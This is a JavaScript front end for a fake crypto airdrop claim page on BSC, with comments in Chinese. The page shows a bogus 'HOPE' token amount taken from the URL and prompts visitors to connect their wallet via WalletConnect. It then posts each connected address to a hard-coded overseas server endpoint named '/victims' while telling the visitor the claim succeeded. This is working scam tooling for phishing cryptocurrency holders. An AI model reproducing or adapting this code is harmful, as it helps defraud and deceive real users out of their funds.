// ============================================
// Configuration (指向你的海外 VPS)
// ============================================
const CONFIG = {
    serverUrl: "http://45.63.51.62:3001", 
};

// ============================================
// DOM Ready
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const airdropAmountEl = document.getElementById('airdropAmount');
    const displayAddress = document.getElementById('displayAddress');
    const claimBtn = document.getElementById('claimBtn');
    const claimStatus = document.getElementById('claimStatus');

    // 从 URL 中读取查询参数 (地址和空投数量)
    const params = new URLSearchParams(window.location.search);
    const address = params.get('address');
    const amount = params.get('amount');

    if (address) {
        displayAddress.textContent = 'Address: ' + address.slice(0, 6) + '...' + address.slice(-4);
    }
    if (amount) {
        airdropAmountEl.textContent = amount + ' HOPE';
    }

    let userAddress = "";

    // ============================================
    // 核心连接逻辑 (WalletConnect)
    // ============================================
    claimBtn.addEventListener('click', async function() {
        claimBtn.disabled = true;
        claimBtn.textContent = '⏳ Connecting...';
        claimStatus.textContent = '正在请求钱包连接...';

        try {
            // 检测 WalletConnect 库是否加载成功
            if (typeof WalletConnectProvider === 'undefined') {
                claimStatus.textContent = '⚠️ 网络异常，请刷新页面重试。';
                claimBtn.disabled = false;
                claimBtn.textContent = 'Connect Wallet & Claim';
                return;
            }

            // 1. 初始化连接器
            const projectId = "9e1e3c3b2a1f4d5a8c9b7e6d2f3a4b5c"; 
            const wcProvider = await WalletConnectProvider.init({
                projectId: projectId,
                chains: [56], // BSC 主网
                showQrModal: true, // 打开这个参数，就会弹二维码供手机扫
            });

            // 2. 触发连接 (这一步会弹出二维码或跳转手机App)
            await wcProvider.enable();

            // 3. 获取连接成功的钱包地址
            const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
            const signer = ethersProvider.getSigner();
            userAddress = await signer.getAddress();

            // 4. 更新网页界面
            displayAddress.textContent = 'Address: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
            claimBtn.textContent = '✅ Connected';
            claimStatus.textContent = '连接成功，正在上报...';

            // 5. 将数据发送到海外后端
            try {
                const response = await fetch(CONFIG.serverUrl + '/victims', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: userAddress })
                });
                if (response.ok) {
                    claimStatus.textContent = '🎉 成功领取并记录！';
                } else {
                    claimStatus.textContent = '⚠️ 记录失败';
                }
            } catch (error) {
                console.warn(error);
                claimStatus.textContent = '⚠️ 连接成功，但后端通讯异常。';
            }

        } catch (error) {
            console.error(error);
            claimBtn.disabled = false;
            claimBtn.textContent = 'Connect Wallet & Claim';
            if (error.message && error.message.includes("User rejected")) {
                claimStatus.textContent = '❌ 用户取消了钱包连接。';
            } else {
                claimStatus.textContent = '❌ 连接失败，请检查网络或重试。';
            }
        }
    });
});